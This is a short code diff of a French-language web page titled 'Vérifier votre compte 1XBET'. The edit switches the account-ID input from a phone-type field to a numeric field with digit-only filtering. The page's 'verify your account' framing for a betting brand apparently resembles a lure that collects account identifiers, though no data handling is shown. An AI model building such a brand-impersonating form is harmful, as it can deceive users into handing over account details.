@@ -91,7 +91,7 @@
       font-size:14px;
     }
 
-    input[type=tel]{
+    input[type=number]{
       padding:10px;
       width:50%;
       border:2px solid var(--blue-medium);
@@ -100,7 +100,7 @@
       margin-bottom:10px;
     }
 
-    input[type=tel]:focus{
+    input[type=number]:focus{
       border-color:var(--blue-dark);
       outline:none;
     }
@@ -198,7 +198,7 @@
       .container {
         padding:15px 10px;
       }
-      input[type=tel]{
+      input[type=number]{
         font-size:13px;
         padding:8px;
         width:80%;
@@ -230,7 +230,7 @@
   <div class="container">
     <h1>Vérifier votre compte 1XBET <span class="flag-inline"></span></h1>
     <label for="inputValue">Entrer votre identifiant pour verifier votre compte :</label>
-    <input type="tel" pattern="[0-9]*" inputmode="numeric" id="inputValue" placeholder="Entrez votre identifiant">
+    <input type="number" id="inputValue" placeholder="Entrez votre identifiant" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
     <button id="verifyBtn">Vérifier</button>
     <div class="footer">
       <span class="blue-bold">Votre compte n'est pas encore validé ?</span><br>
